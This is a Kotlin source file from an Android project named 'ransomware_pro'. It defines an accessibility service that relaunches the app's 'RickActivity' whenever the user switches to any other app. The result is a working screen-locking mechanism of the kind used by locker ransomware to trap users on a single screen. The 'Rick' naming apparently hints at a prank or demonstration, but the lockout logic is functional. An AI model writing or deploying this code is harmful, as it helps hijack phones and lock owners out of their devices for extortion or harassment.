package com.example.ransomware_pro.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.example.ransomware_pro.activities.MainActivity
import com.example.ransomware_pro.activities.RickActivity
import com.example.ransomware_pro.utils.Logger

class MyAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        Logger.debug("in onAccessibilityEvent "+event?.packageName)
        if(event?.packageName!=applicationContext.packageName){
            val intent:Intent= Intent(this, RickActivity::class.java)
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }

    override fun onInterrupt() {
        Logger.debug("in onInterrupt")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Logger.debug("in onServiceConnected")

    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        Logger.debug("in onKeyEvent")
        return super.onKeyEvent(event)
    }
}